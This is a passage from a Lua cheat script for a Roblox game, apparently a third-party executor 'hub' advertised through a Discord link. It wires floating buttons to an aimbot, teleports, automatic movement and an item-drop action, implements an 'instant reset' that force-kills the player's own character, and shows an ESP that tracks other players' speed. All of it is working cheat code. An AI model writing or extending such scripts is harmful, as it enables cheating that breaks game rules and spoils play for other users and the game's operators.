	infoLabel.Text = lastFps.." FPS | "..(lastPing and (lastPing.."ms") or "--ms")
end
RunService.RenderStepped:Connect(function()
	frameCount=frameCount+1; local now=tick()
	if now-lastFpsTime>=1 then
		lastFps=math.floor(frameCount/(now-lastFpsTime)); frameCount=0; lastFpsTime=now; refreshInfoLabel()
	end
end)
-- Same source as the "Don't Duel" badge (LP:GetNetworkPing()) so both
-- readouts always agree — previously this used the Stats service
-- ("Data Ping") which can disagree with GetNetworkPing() by tens of ms.
-- Only update lastPing if the fetch succeeded, otherwise keep the
-- last known value instead of falling back to 0 (bug: display stuck at "0ms").
task.spawn(function()
	while stealWidget.Parent do
		local success, ping = pcall(function()
			return math.floor(LP:GetNetworkPing() * 1000 + 0.5)
		end)
		if success and type(ping) == "number" then
			lastPing = ping
			refreshInfoLabel()
		end
		task.wait(0.5)
	end
end)
end

-- ===================================================================
-- FLOATING BUTTONS — replaces the fixed Quick Panel + attach/detach.
-- Each action has a toggle in Settings that spawns/despawns its
-- own floating square button. "Lock" freezes the drag once placed.
-- ===================================================================
-- Grid order + position formula (_FLOAT_GRID_ORDER / _floatGridIndex /
-- _floatGridPos) live earlier in the file, before buildPage("Visual",...),
-- so the "Button Size" slider can share this exact math.

local function makeFloatButton(id)
	if _floatBtns[id] then return _floatBtns[id] end
	local def = _floatDefs[id]; if not def then return nil end

	local btn = Instance.new("TextButton", gui)
	btn.Name = "Float_"..id
	local saved = _floatPositions[id]
	btn.Size = UDim2.new(0, FLOAT_SZ, 0, FLOAT_SZ)
	btn.Position = saved and UDim2.new(saved[1], saved[2], saved[3], saved[4]) or _floatGridPos(id, FLOAT_SZ)
	btn.BackgroundColor3 = C_ROW; btn.BackgroundTransparency = 0; btn.BorderSizePixel = 0
	-- [BUGFIX] Used to be btn.Text directly ("texte pas visible, image non
	-- plus") — a GuiButton's own native Text always renders BEHIND its
	-- children, so bgWindow/bgDim below (added for the background-image
	-- feature) were silently covering both. Moved the label into its own
	-- child TextLabel (lbl, further down) instead — same proven pattern the
	-- settings-panel rows already use, created AFTER bgWindow/bgDim so
	-- normal sibling order puts it on top, with an explicit higher ZIndex
	-- as a second guarantee.
	btn.Text = ""; btn.AutoButtonColor = false
	btn.ZIndex = 500; btn.Active = true
	addCorner(btn, 14); addLivingStroke(btn, 1)

	-- Background-image window — shown whenever one of the 2 allowed
	-- backgrounds is active, independent of whether this button itself is
	-- toggled on ("comme l'ui, dès que je choisis l'image y'a le
	-- background — pareil pour les boutons"). Kept in sync by
	-- _syncButtonsBgWindows via the shared GetPropertyChangedSignal hook —
	-- registered into _floatBgEntries a few lines down, applied once
	-- immediately after so a button spawned after a background was already
	-- picked shows it right away too.
	-- [BUGFIX] Used to be an oversized (WIN_W x WIN_H) image offset per
	-- button to fake a "window" into the full picture — but ClipsDescendants
	-- only ever clips to a plain RECTANGLE, never to the button's own
	-- rounded corners (same limitation already hit once before in this
	-- file, on moonIconShadowClip), so the square edge of that oversized
	-- image poked out past the round silhouette ("elle dépasse, elle
	-- sort"). The per-button hash offset also meant most buttons showed a
	-- random slice instead of Aizen's actual face ("doit plus viser Aizen
	-- le centre"). Simplest fix that solves both: same size as the button
	-- itself, ScaleType.Crop centers automatically — identical, already-
	-- proven pattern to _bgImageLabel on the main panel. Every button now
	-- shows the same well-composed centered crop, and can't ever overflow
	-- since there's no oversized image left to clip in the first place.
	local bgWindow = Instance.new("ImageLabel", btn)
	bgWindow.Name = "BgWindow"
	bgWindow.Size = UDim2.new(1, 0, 1, 0)
	bgWindow.BackgroundTransparency = 1
	bgWindow.ScaleType = Enum.ScaleType.Crop
	bgWindow.ZIndex = btn.ZIndex
	bgWindow.Visible = false
	addCorner(bgWindow, 14)
	local bgDim = Instance.new("Frame", btn)
	bgDim.Name = "BgDim"
	bgDim.Size = UDim2.new(1,0,1,0); bgDim.BackgroundColor3 = Color3.fromRGB(0,0,0)
	bgDim.BackgroundTransparency = 0.3; bgDim.BorderSizePixel = 0  -- plus opaque qu'avant (0.45→0.3) pour plus de contraste
	bgDim.ZIndex = btn.ZIndex
	bgDim.Visible = false
	addCorner(bgDim, 14)

	-- The button's actual label — see the [BUGFIX] note above btn.Text.
	-- Created after bgWindow/bgDim (sibling order alone would already put
	-- it on top) with an explicit +1 ZIndex on top of that as a second,
	-- unambiguous guarantee it always wins.
	local lbl = Instance.new("TextLabel", btn)
	lbl.Name = "Lbl"
	lbl.Size = UDim2.new(1,0,1,0); lbl.BackgroundTransparency = 1
	lbl.Text = def.label; lbl.TextColor3 = C_WHITE; lbl.Font = Enum.Font.GothamBold
	lbl.TextScaled = false; lbl.TextSize = 9; lbl.TextWrapped = true
	lbl.ZIndex = btn.ZIndex + 1
	-- Readability over the background image (dim overlay alone wasn't
	-- enough): a dark outline around the text itself, works no matter what
	-- shade of the picture ends up behind any given letter.
	local lblStroke = Instance.new("UIStroke", lbl)
	lblStroke.Color = Color3.new(0,0,0); lblStroke.Thickness = 1
	lblStroke.Transparency = 0.15; lblStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
	local lblPad = Instance.new("UIPadding", lbl)
	lblPad.PaddingLeft = UDim.new(0,4); lblPad.PaddingRight = UDim.new(0,4)
	lblPad.PaddingTop = UDim.new(0,3); lblPad.PaddingBottom = UDim.new(0,3)
	addLivingTextGradient(lbl)

	-- [FIX] "faut un signe qu'il est actif" — le seul signal avant ça était
	-- btn.BackgroundColor3 (C_ROW noir → C_ON_BG bleu marine), une différence
	-- bien trop subtile pour se voir en jeu, et quasi invisible dès qu'un
	-- background image + bgDim (70% opaque) le recouvre. Un point net,
	-- au-dessus de TOUT (ZIndex = lbl + 1), donne un signal sans ambiguïté.
	local activeDot = Instance.new("Frame", btn)
	activeDot.Name = "ActiveDot"
	activeDot.Size = UDim2.new(0, 9, 0, 9)
	activeDot.Position = UDim2.new(1, -13, 0, 4)
	activeDot.BackgroundColor3 = Color3.fromRGB(80, 230, 120)
	activeDot.BorderSizePixel = 0
	activeDot.ZIndex = lbl.ZIndex + 1
	activeDot.Visible = false
	addCorner(activeDot, 5)
	local activeDotStroke = Instance.new("UIStroke", activeDot)
	activeDotStroke.Color = Color3.new(0,0,0); activeDotStroke.Thickness = 1
	activeDotStroke.Transparency = 0.2

	local function setActive(on)
		btn.BackgroundColor3 = on and C_ON_BG or C_ROW
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundTransparency = 0}):Play()
		activeDot.Visible = on
		if on then
			activeDot.Size = UDim2.new(0, 4, 0, 4)
			activeDot.Position = UDim2.new(1, -10.5, 0, 8.5)
			TweenService:Create(activeDot, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
				Size = UDim2.new(0, 9, 0, 9), Position = UDim2.new(1, -13, 0, 4),
			}):Play()
		end
	end
	table.insert(_floatBgEntries, { bgWindow = bgWindow, dim = bgDim })
	_syncButtonsBgWindows()  -- applies immediately if a background is already picked

	-- Drag (disabled when locked). When "Move Together" is on (Settings),
	-- dragging any one spawned button carries every other spawned one along
	-- by the same delta — a snapshot of everyone's start position is taken
	-- once, and each frame every button is placed at its own snapshot + d.
	local drag, ds, dp = false, nil, nil
	btn.InputBegan:Connect(function(inp)
		if _floatLocked then return end
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			drag = true; ds = inp.Position; dp = btn.Position
			if _floatLinkMove then
				_linkDragSnapshot = {}
				for lid, lentry in pairs(_floatBtns) do
					if lentry.frame and lentry.frame.Parent then
						_linkDragSnapshot[lid] = lentry.frame.Position
					end
				end
			end
			inp.Changed:Connect(function()
				if inp.UserInputState == Enum.UserInputState.End then
					drag = false
					local p2 = btn.Position
					_floatPositions[id] = {p2.X.Scale, p2.X.Offset, p2.Y.Scale, p2.Y.Offset}
					if _linkDragSnapshot then
						for lid, lentry in pairs(_floatBtns) do
							if lentry.frame and lentry.frame.Parent then
								local lp = lentry.frame.Position
								_floatPositions[lid] = {lp.X.Scale, lp.X.Offset, lp.Y.Scale, lp.Y.Offset}
							end
						end
						_linkDragSnapshot = nil
					end
					if _GH.autoSave then _GH.autoSave() end
				end
			end)
		end
	end)
	btn.InputChanged:Connect(function(inp)
		if _floatLocked or not drag or not ds then return end
		if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
			local d = inp.Position - ds
			btn.Position = UDim2.new(dp.X.Scale, dp.X.Offset + d.X, dp.Y.Scale, dp.Y.Offset + d.Y)
			if _linkDragSnapshot then
				for lid, lentry in pairs(_floatBtns) do
					if lid ~= id and lentry.frame and lentry.frame.Parent then
						local sp = _linkDragSnapshot[lid]
						if sp then
							lentry.frame.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
						end
					end
				end
			end
		end
	end)

	btn.MouseButton1Click:Connect(function()
		if def.onClick then def.onClick() end
		if def.momentary then
			setActive(true)
			task.delay(0.2, function() setActive(false) end)
		elseif def.isActive then
			setActive(def.isActive())
		end
	end)

	_floatBtns[id] = {frame = btn, setActive = setActive}
	if def.isActive then setActive(def.isActive()) end
	return _floatBtns[id]
end

local function removeFloatButton(id)
	local entry = _floatBtns[id]
	if entry then entry.frame:Destroy(); _floatBtns[id] = nil end
end

local function setFloatLocked(on)
	_floatLocked = on
end

-- Periodic visual sync (real ON/OFF state, no matter where
-- the change came from — clicking the button, a keybind, or another toggle)
task.spawn(function()
	while gui.Parent do
		for id, entry in pairs(_floatBtns) do
			local def = _floatDefs[id]
			if def and def.isActive and not def.momentary then
				entry.setActive(def.isActive())
			end
		end
		task.wait(0.3)
	end
end)

-- Force-refresh all float button background colors against current C_ON_BG.
-- Called by applyTheme and at end of MH_load so theme switches / load order
-- can never leave buttons in the wrong color.
_GH.refreshFloatActiveColors = function()
	for id, entry in pairs(_floatBtns) do
		local def = _floatDefs[id]
		if def and entry.frame and entry.frame.Parent then
			if def.isActive and not def.momentary then
				entry.setActive(def.isActive())
			else
				entry.setActive(false)
			end
		end
	end
end

-- ── Action registration ──────────────────────────────────────
_floatDefs.dropbr = {
	label = "DROP BR",
	onClick = function() runDropBrainrot() end,
	momentary = true,
}
_floatDefs.autoleft = {
	label = "AUTO\nLEFT",
	onClick = function()
		State.autoLeftEnabled = not State.autoLeftEnabled
		if State.autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
	end,
	isActive = function() return State.autoLeftEnabled end,
}
_floatDefs.aimbot = {
	label = "AIM BOT",
	onClick = function()
		local on = not AB.active
		if on then if ABP.active then ABP.stop() end; AB.start() else AB.stop() end
	end,
	isActive = function() return AB.active end,
}
_floatDefs.autoright = {
	label = "AUTO\nRIGHT",
	onClick = function()
		State.autoRightEnabled = not State.autoRightEnabled
		if State.autoRightEnabled then startAutoRight() else stopAutoRight() end
	end,
	isActive = function() return State.autoRightEnabled end,
}
_floatDefs.tpdown = {
	label = "TP DOWN",
	onClick = function() tpToGround() end,
	momentary = true,
}
_floatDefs.battp = {
	label = "BAT TP",
	onClick = function()
		local on = not AimV3.active
		if on then AimV3.start() else AimV3.stop() end
	end,
	isActive = function() return AimV3.active end,
}


-- ===================================================================
-- INSTANT RESET — fling + void + force-kill (porté depuis "insta reset
-- by forest"). Remplace l'ancienne logique (capture d'un remote "RE/…"
-- spécifique à ce jeu + FireServer répété d'un payload "balloon") par
-- une méthode universelle qui ne dépend d'AUCUN remote du jeu :
--   1. Gèle la caméra (Scriptable + BindToRenderStep) pour éviter le
--      vertige visuel pendant la catapulte
--   2. Cache le personnage localement (LocalTransparencyModifier) —
--      invisible pour SOI uniquement, zéro effet sur les autres joueurs
--   3. Débloque puis catapulte le HumanoidRootPart vers le haut
--      (AssemblyLinearVelocity/Velocity) pendant FLING_TIME
--   4. Si toujours pas respawn, l'envoie sous FallenPartsDestroyHeight
--      pendant VOID_TIME — le moteur Roblox lui-même s'occupe de tuer
--      le personnage, aucune dépendance au jeu
--   5. Dernier recours : force Health=0 + ChangeState(Dead) +
--      BreakJoints en boucle jusqu'à TIMEOUT
--   6. Nettoie tout (bind caméra, connexions) et restaure la caméra
--      sur le nouveau personnage dès qu'il apparaît
--
-- Point d'intégration inchangé : _G.AceCursedInstaReset() reste le nom
-- appelé par tout le reste du hub (_GH.MH_instareset, le bouton
-- flottant "INSTANT RESET", le keybind Settings > Keybind, Auto Reset
-- on Death, Auto Reset Medusa) — rien d'autre à toucher ailleurs dans
-- le fichier. _irResetting empêche un double-déclenchement si le
-- bouton/touche est pressé plusieurs fois pendant une catapulte en cours
-- (l'ancienne version n'avait aucune protection contre ça).
--
-- Compromis assumé : si le personnage est DÉJÀ mort (Health<=0) au
-- moment de l'appel, cette version ne fait rien — contrairement à
-- l'ancienne qui tentait un FireServer de secours sur son remote
-- spécifique. Cette méthode universelle n'a pas d'équivalent générique
-- pour ce cas précis ; le respawn normal du jeu prend le relais.
-- ===================================================================
local _IR_CAM_BIND = _NS .. "InstaResetCam"
local _IR_CFG = {
	FLING_TIME  = 0.4,
	FLING_POWER = 50000,
	USE_VOID    = true,
	VOID_TIME   = 0.6,
	TIMEOUT     = 6,
}
local _irResetting = false

local function _irHideLocally(obj)
	if obj:IsA("BasePart") or obj:IsA("Decal") then
		obj.LocalTransparencyModifier = 1
	end
end

function _G.AceCursedInstaReset()
	if _irResetting then return end
	local char = LP.Character
	if not char or not char.Parent then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum or hum.Health <= 0 then return end
	local hrp = hum.RootPart or char:FindFirstChild("HumanoidRootPart")

	-- The forced kill/respawn below ragdolls the character just like a real
	-- stun would, which would otherwise falsely flash the "READY!!" speed
	-- billboard into a stun countdown right after a self-reset. Suppressed
	-- for a window generous enough to cover a slow death/respawn/settle
	-- round-trip (server latency can easily eat the old 1.5s on its own,
	-- before the new character has even finished loading in).
	if _GH.setStunSuppressed then _GH.setStunSuppressed(true) end
	task.delay(3.0, function() if _GH.setStunSuppressed then _GH.setStunSuppressed(false) end end)

	_irResetting = true
	task.spawn(function()
		-- [FIX B5] pcall global : garantit que _irResetting revient à false
		-- même si une erreur non protégée échappe à l'un des pcall internes.
		-- Sans ça, un crash laissait _irResetting=true pour toute la session.
		local _ir_ok, _ir_err = pcall(function()
		local cam = workspace.CurrentCamera
		local frozen = cam.CFrame
		local old_type = cam.CameraType
		pcall(function()
			cam.CameraType = Enum.CameraType.Scriptable
			RunService:BindToRenderStep(_IR_CAM_BIND, Enum.RenderPriority.Camera.Value + 1, function()
				cam.CFrame = frozen
			end)
		end)

		local added
		pcall(function()
			for _, obj in ipairs(char:GetDescendants()) do pcall(_irHideLocally, obj) end
			added = char.DescendantAdded:Connect(function(obj) pcall(_irHideLocally, obj) end)
		end)

		local new_char
		local respawned = LP.CharacterAdded:Connect(function(c) new_char = c end)

		local function unlock()
			pcall(function() hum.PlatformStand = false end)
			pcall(function() hum.Sit = false end)
			pcall(function() hum.AutoRotate = true end)
		end
		unlock()

		for _, obj in ipairs(char:GetDescendants()) do
			if obj:IsA("BasePart") then
				pcall(function() obj.Anchored = false end)
				pcall(function() obj.CanCollide = false end)
			elseif obj.Name == "SeatWeld" then
				pcall(function() obj:Destroy() end)
			end
		end

		local started = os.clock()
		local function alive_hrp()
			if hrp and hrp.Parent then return hrp end
			hrp = hum.RootPart or char:FindFirstChild("HumanoidRootPart")
			if hrp and hrp.Parent then return hrp end
			return nil
		end

		local fling_until = os.clock() + _IR_CFG.FLING_TIME
		while not new_char and os.clock() < fling_until and hum.Parent do
			unlock()
			pcall(function() hum.HipHeight = 1e30 end)
			local root = alive_hrp()
			if root then
				pcall(function() root.Anchored = false end)
				pcall(function() root.AssemblyLinearVelocity = Vector3.new(0, _IR_CFG.FLING_POWER, 0) end)
				-- [FIX #2] root.Velocity supprimée (dépréciée, AssemblyLinearVelocity déjà juste au-dessus)
			end
			RunService.Heartbeat:Wait()
		end

		if _IR_CFG.USE_VOID and not new_char then
			local floor = -500
			pcall(function() floor = workspace.FallenPartsDestroyHeight end)
			local void_until = os.clock() + _IR_CFG.VOID_TIME
			while not new_char and os.clock() < void_until do
				local root = alive_hrp()
				if not root then break end
				pcall(function() root.CFrame = CFrame.new(0, floor - 500, 0) end)
				pcall(function() root.AssemblyLinearVelocity = Vector3.new(0, -_IR_CFG.FLING_POWER, 0) end)
				RunService.Heartbeat:Wait()
			end
		end

		while not new_char and os.clock() - started < _IR_CFG.TIMEOUT do
			if hum.Parent then
				pcall(function() hum.Health = 0 end)
				pcall(function() hum:ChangeState(Enum.HumanoidStateType.Dead) end)
			end
			if char.Parent then pcall(function() char:BreakJoints() end) end
			task.wait(0.1)
		end

		pcall(function() respawned:Disconnect() end)
		if added then pcall(function() added:Disconnect() end) end
		pcall(function() RunService:UnbindFromRenderStep(_IR_CAM_BIND) end)
		pcall(function()
			cam.CameraType = old_type == Enum.CameraType.Scriptable and Enum.CameraType.Custom or old_type
			if new_char then
				local new_hum = new_char:FindFirstChildOfClass("Humanoid")
					or new_char:WaitForChild("Humanoid", 5)
				if new_hum then cam.CameraSubject = new_hum end
			end
		end)
		end)  -- [FIX B5] ferme le pcall global
		if not _ir_ok then warn("[MH][InstaReset] erreur interne: " .. tostring(_ir_err)) end
		_irResetting = false  -- [FIX B5] toujours réinitialisé, même après erreur
	end)
end

do
	_GH.MH_instareset = _G.AceCursedInstaReset

	_floatDefs.instareset = {
		label    = "INSTANT\nRESET",
		onClick  = _G.AceCursedInstaReset,
		momentary = true,
	}
end

_floatDefs.aimv2 = {
	label = "AIM V2",
	onClick = function()
		local on = not ABP.active
		if on then if AB.active then AB.stop() end; ABP.start() else ABP.stop() end
	end,
	isActive = function() return ABP.active end,
}
_GH.makeFloatButton   = makeFloatButton
_GH.removeFloatButton = removeFloatButton
_GH.setFloatLocked    = setFloatLocked
_GH.floatDefs         = _floatDefs
_GH.floatPositions    = _floatPositions

-- ===================================================================
-- STUN TIMER BILLBOARD (au-dessus du personnage)
-- STUN TIMER BILLBOARD (above the character)
-- 3 → red | 2 → yellow | 1 → cyan | 0 → "GO" green
do
	local STUN_DURATION   = 3.0
	local stunActive      = false
	local stunStartTime   = 0
	local stunConn        = nil
	local stateConn       = nil
	local lastSec         = nil
	local bbGui           = nil
	local timerLbl        = nil

	local speedLbl = nil

	-- A fixed grey/white gradient would be fine for a one-time
	-- setup, but this billboard gets torn down and rebuilt from scratch on
	-- EVERY respawn/reset (see below), and applyTheme() only re-colors
	-- whatever label instance already exists at the moment a theme button
	-- is clicked. Net effect: die or reset even once after picking e.g.
	-- Crimson, and the freshly rebuilt "READY!!"/"Speed" labels silently
	-- fall back to grey and never regain the active theme's color until
	-- the theme is manually re-applied. This mirrors applyTheme's own
	-- noir/else branches so a fresh billboard always matches current theme.
	local function themedStunShimmer(label)
		local g = Instance.new("UIGradient", label)
		if _currentTheme == "noir" then
			g.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    Color3.fromRGB(60,  60,  60)),
				ColorSequenceKeypoint.new(0.25, Color3.fromRGB(230, 230, 230)),
				ColorSequenceKeypoint.new(0.5,  Color3.fromRGB(140, 140, 140)),
				ColorSequenceKeypoint.new(0.75, Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(1,    Color3.fromRGB(60,  60,  60)),
			})
		else
			g.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0,    C_DEEP3),
				ColorSequenceKeypoint.new(0.25, C_DEEP4),
				ColorSequenceKeypoint.new(0.5,  C_DEEP3),
				ColorSequenceKeypoint.new(0.75, C_DEEP4),
				ColorSequenceKeypoint.new(1,    C_DEEP3),
			})
		end
		g.Rotation = 0
		table.insert(_livingGradients, g)
		return g
	end

	local function createBB()
		if bbGui then return end
		local char = LP.Character; if not char then return end
		local head = char:FindFirstChild("Head"); if not head then return end
		bbGui = Instance.new("BillboardGui", head)
		bbGui.Name = _NS
		bbGui.Size = UDim2.new(0,130,0,70)
		bbGui.StudsOffset = Vector3.new(0,3.5,0)
		bbGui.AlwaysOnTop = true
		-- "speed" label (above)
		speedLbl = Instance.new("TextLabel", bbGui)
		speedLbl.Size = UDim2.new(1,0,0,26)
		speedLbl.Position = UDim2.new(0,0,0,0)
		speedLbl.BackgroundTransparency = 1
		speedLbl.Text = "Speed: 0"
		speedLbl.TextColor3 = Color3.new(1,1,1)
		speedLbl.TextScaled = false
		speedLbl.TextSize = 19
		speedLbl.Font = Enum.Font.GothamBlack
		speedLbl.TextStrokeTransparency = 1
		speedLbl.TextXAlignment = Enum.TextXAlignment.Center
		themedStunShimmer(speedLbl)
		-- READY!! / timer label (below)
		timerLbl = Instance.new("TextLabel", bbGui)
		timerLbl.Size = UDim2.new(1,0,0,28)
		timerLbl.Position = UDim2.new(0,0,0,24)
		timerLbl.BackgroundTransparency = 1
		timerLbl.Text = "READY!!"
		timerLbl.TextColor3 = Color3.new(1,1,1)
		timerLbl.TextScaled = true
		timerLbl.Font = Enum.Font.GothamBlack
		timerLbl.TextStrokeTransparency = 1
		themedStunShimmer(timerLbl)
		-- Discord (bottom line, same billboard as Speed/READY)
		local discordBBLbl = Instance.new("TextLabel", bbGui)
		discordBBLbl.Size = UDim2.new(1,0,0,16)
		discordBBLbl.Position = UDim2.new(0,0,0,54)
		discordBBLbl.BackgroundTransparency = 1
		discordBBLbl.Text = "discord.gg/moonn"
		discordBBLbl.TextColor3 = Color3.new(1,1,1)
		-- [BUGFIX] TextScaled (like timerLbl above) instead of a fixed size —
		-- the full link is longer than the box is wide; scaling keeps it
		-- readable and never clipped, matching how "READY!!" already behaves.
		discordBBLbl.TextScaled = true
		discordBBLbl.Font = Enum.Font.GothamBold
		discordBBLbl.TextStrokeTransparency = 1
		discordBBLbl.TextXAlignment = Enum.TextXAlignment.Center
		themedStunShimmer(discordBBLbl)
		_GH.speedLblRef = speedLbl
		_GH.timerLblRef = timerLbl
		_GH.discordBBRef = discordBBLbl
	end

	local function updateDisplay()
		if not timerLbl then createBB(); if not timerLbl then return end end
		if not stunActive then
			timerLbl.Text = "READY!!"
			timerLbl.TextColor3 = Color3.new(1,1,1)
			return
		end
		local rem = math.max(0, STUN_DURATION-(tick()-stunStartTime))
		if rem <= 0 then
			stunActive = false
			if stunConn then stunConn:Disconnect(); stunConn = nil end
			timerLbl.Text = "READY!!"
			timerLbl.TextColor3 = Color3.new(1,1,1)
			return
		end
		local sec = math.ceil(rem)
		if sec ~= lastSec then
			lastSec = sec
			timerLbl.Text = tostring(sec)
			if     sec == 3 then timerLbl.TextColor3 = C_RED
			elseif sec == 2 then timerLbl.TextColor3 = C_SILVER
			elseif sec == 1 then timerLbl.TextColor3 = C_MOON2
			end
		end
	end

	-- Suppressed right after an Instant Reset: the forced kill/respawn
	-- ragdolls the character exactly like a real stun would, which was
	-- falsely flashing "READY!!" into a stun countdown (and its red/silver/
	-- moon2 colors) even though nobody actually hit the player.
	local _stunSuppressed = false
	_GH.setStunSuppressed = function(on)
		_stunSuppressed = on
		-- Suppressing only ever blocked a NEW stun countdown from starting.
		-- The common real case is pressing Instant Reset WHILE already
		-- stunned (that's usually exactly why it gets pressed) — the
		-- countdown was already running before suppression turned on, so
		-- it kept cycling its red/silver/moon2 colors underneath the
		-- suppression window regardless. Force it back to READY right now
		-- too, or the "wrong color after reset" symptom never actually
		-- goes away for that (very common) case.
		if on and stunActive then
			stunActive = false
			if stunConn then stunConn:Disconnect(); stunConn = nil end
			if timerLbl then
				timerLbl.Text = "READY!!"
				timerLbl.TextColor3 = Color3.new(1,1,1)
			end
		end
	end

	local function onStun()
		if stunActive or _stunSuppressed then return end
		stunActive = true; stunStartTime = tick(); lastSec = nil
		createBB(); updateDisplay()
		if stunConn then stunConn:Disconnect() end
		stunConn = RunService.Heartbeat:Connect(updateDisplay)
	end

	local function setupDetection(char)
		if stateConn then stateConn:Disconnect() end
		local hum = char and char:FindFirstChildOfClass("Humanoid"); if not hum then return end
		stateConn = hum.StateChanged:Connect(function(_, ns)
			if ns==Enum.HumanoidStateType.Physics or ns==Enum.HumanoidStateType.Ragdoll
				or ns==Enum.HumanoidStateType.FallingDown or ns==Enum.HumanoidStateType.GettingUp then
				onStun()
			end
		end)
	end

	LP.CharacterAdded:Connect(function(char)
		if bbGui then pcall(function() bbGui:Destroy() end); bbGui=nil; timerLbl=nil; speedLbl=nil end
		task.wait(0.2); createBB(); setupDetection(char)
	end)
	if LP.Character then task.wait(0.1); createBB(); setupDetection(LP.Character) end

	-- Speed update — delta position/time calculation (real measured speed, not the property)
	local _lastPos, _lastT = nil, tick()
	RunService.RenderStepped:Connect(function()
		if not speedLbl or not speedLbl.Parent then return end
		local char = LP.Character; if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local now = tick()
		local pos = Vector3.new(root.Position.X, 0, root.Position.Z)
		if _lastPos then
			local dt = now - _lastT
			if dt > 0 then
				local dist = (pos - _lastPos).Magnitude
				local spd = dist / dt
				speedLbl.Text = string.format("Speed: %.1f", spd)
			end
		end
		_lastPos, _lastT = pos, now
	end)

	-- Other players' speed (billboard above their head)
	-- Other players' speed — a single global Heartbeat
	local _playerSpeedBBs = {}  -- plr → {bb, lbl, char}
	_GH.playerSpeedBBs = _playerSpeedBBs

	-- "Speed ESP" toggle — this billboard already existed and was always
	-- on with no way to hide it; this just adds visibility control over
	-- it (defaults to true = exactly the old always-on behavior, so
	-- nothing changes for anyone until the toggle is actually touched).
	local _speedBBVisible = true
	local function setSpeedBBVisible(on)
		_speedBBVisible = on
		for _, data in pairs(_playerSpeedBBs) do
			if data.bb then data.bb.Enabled = on end
		end
	end
	_GH.setSpeedESPVisible = setSpeedBBVisible

	local function setupPlayerSpeedBB(plr)
		if plr == LP then return end
		local function attachBB(char)
			if _playerSpeedBBs[plr] then
				pcall(function() _playerSpeedBBs[plr].bb:Destroy() end)
			end
			local head = char:WaitForChild("Head", 5); if not head then return end
			local bb = Instance.new("BillboardGui", head)
			bb.Name = "MoonSpeedBB"; bb.Size = UDim2.new(0,110,0,22)
			bb.StudsOffset = Vector3.new(0,2.2,0); bb.AlwaysOnTop = true
			bb.Enabled = _speedBBVisible
			local lbl = Instance.new("TextLabel", bb)
			lbl.Size = UDim2.new(1,0,1,0); lbl.BackgroundTransparency = 1
			lbl.Text = "0"; lbl.TextColor3 = C_MOON2
			lbl.TextScaled = true; lbl.Font = Enum.Font.GothamBlack
			lbl.TextStrokeTransparency = 0.35
			lbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
			addLivingTextGradient(lbl)
			_playerSpeedBBs[plr] = {bb=bb, lbl=lbl, char=char}
		end
		if plr.Character then task.spawn(function() attachBB(plr.Character) end) end
		plr.CharacterAdded:Connect(function(char) task.spawn(function() attachBB(char) end) end)
	end

	-- A single Heartbeat for all players — delta position/time
	RunService.Heartbeat:Connect(function()
		local now = tick()
		for plr, data in pairs(_playerSpeedBBs) do
			if not data.lbl.Parent then
				_playerSpeedBBs[plr] = nil
			else
				local root = data.char:FindFirstChild("HumanoidRootPart")
				if root then
					local pos = Vector3.new(root.Position.X, 0, root.Position.Z)
					if data._lastPos then
						local dt = now - (data._lastT or now)
						if dt > 0 then
							local dist = (pos - data._lastPos).Magnitude
							local spd2 = dist / dt
							if spd2 < 800 then
								data.lbl.Text = string.format("%.1f", spd2)
							end
						end
					end
					data._lastPos, data._lastT = pos, now
				end
			end
		end
	end)

	for _, plr in ipairs(Players:GetPlayers()) do setupPlayerSpeedBB(plr) end
	Players.PlayerAdded:Connect(setupPlayerSpeedBB)
	Players.PlayerRemoving:Connect(function(plr)
		if _playerSpeedBBs[plr] then
			pcall(function() _playerSpeedBBs[plr].bb:Destroy() end)
			_playerSpeedBBs[plr] = nil
		end
	end)
end

-- ===================================================================
-- AUTO-SAVE SYSTEM (debounce + full states, raw__72_ style)
-- ===================================================================
local HS      = game:GetService("HttpService")
local MH_FILE = "rbxdata_mhv3x_" .. tostring(LP.UserId) .. ".json"
local _saveDebounce = false
local function ks(e)
	return {
		key = e and e.key and tostring(e.key):gsub("Enum.KeyCode.","") or nil,
		gp  = e and e.gp  and tostring(e.gp):gsub("Enum.KeyCode.","")  or nil,
	}
end

-- Deferred save (0.5s) to batch fast successive changes
-- Uses task.spawn + task.wait instead of task.delay (better executor compatibility)
-- [REVERTED] The forceImmediate variant (called synchronously from a button
-- click, bypassing task.spawn) caused a noticeable hitch — writefile + the
-- full JSONEncode running inline on the click handler's stack instead of
-- yielded — which was visible as movement rollback. Back to the original,
-- always-deferred version below; every call site (all via _GH.autoSave())
-- behaves exactly as it did before this whole detour.
local function MH_save()
	if _saveDebounce then return end
	_saveDebounce = true
	task.spawn(function()
		task.wait(0.5)
		local ok = pcall(function()
			local kb = _GH.MH_KB or {}
			local data = {
				normalSpeed      = State.normalSpeed,
				carrySpeed       = State.carrySpeed,
				laggerSpeed      = State.laggerSpeed,
				laggerCarrySpeed = State.laggerCarrySpeed,
				speedType        = State.speedType,
				laggerActive     = State.laggerActive,
				laggerCarryActive= State.laggerCarryActive,
				autoLeftEnabled  = State.autoLeftEnabled,
				autoRightEnabled = State.autoRightEnabled,
				antiRagdollEnabled  = State.antiRagdollEnabled,
				medusaCounterEnabled= State.medusaCounterEnabled,
				batCounterEnabled= BatCounter and BatCounter.active or false,
				aimbotEnabled    = AB and AB.active or false,
				aimbotV2Enabled  = ABP and ABP.active or false,
				aimSpeed         = AB and AB.SPEED or nil,
				infJumpEnabled   = IJ and IJ.active or false,
				autoGrabEnabled  = AutoSteal and AutoSteal.Enabled or false,
				grabRadius       = AutoSteal and AutoSteal.Radius or nil,
				autoGrabMethod   = (_GH.getAutoGrabMethod and _GH.getAutoGrabMethod()) or 1,
				floatSpawned = (function()
					local ids = {}
